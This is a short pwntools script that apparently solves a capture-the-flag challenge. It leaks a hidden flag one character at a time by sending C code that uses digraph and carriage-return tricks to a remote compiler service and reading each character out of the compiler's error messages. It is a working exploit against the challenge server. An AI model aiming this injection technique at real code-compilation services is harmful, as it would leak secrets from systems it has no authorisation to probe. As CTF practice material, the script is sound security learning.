from pwn import remote


# code = """
# %:import"flag.h"\rstatic_assert(FLAG);
# """

flag = []

for i in range(53):
    r = remote("gold.b01le.rs", 7003)
    code = f"%:undef\tflag\rstatic_assert(flag[{i}]==0);"
    r.sendline(code.strip().encode())
    resp = r.recvall().strip().decode()

    # for j, val in enumerate(resp.split()):
    #     print(j, val)
    # exit()

    # if I were cool I would've done this with regex capturing groups but I dunno how those work
    num = int(''.join([s for s in resp.split()[18] if s.isdigit()]))
    flag.append(num)

print(''.join([chr(x) for x in flag]))